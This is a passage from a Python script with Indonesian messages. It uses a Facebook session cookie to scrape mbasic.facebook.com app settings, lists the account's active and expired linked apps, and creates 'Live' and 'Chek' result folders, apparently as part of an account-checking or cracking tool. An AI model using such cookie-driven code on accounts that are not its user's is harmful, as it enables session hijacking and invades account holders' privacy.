   print ("\r%s  \033[0m                ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
 except AttributeError:
  print ("\r    %s\033[0m cookie invalid"%(M))
 w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
 sop = bs4.BeautifulSoup(w,"html.parser")
 x = sop.find("form",method="post")
 game = [i.text for i in x.find_all("h3")]
 try:
  for i in range(len(game)):
   print ("\r%s  \033[0m                ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
 except AttributeError:
  print ("\r    %s \033[0mcookie invalid"%(M))
        
if __name__=='__main__':
	os.system("cls" if os.name == "nt" else "clear")
	try:os.mkdir('Live')
	except:pass
	try:os.mkdir('Chek')
	except:pass
	menu()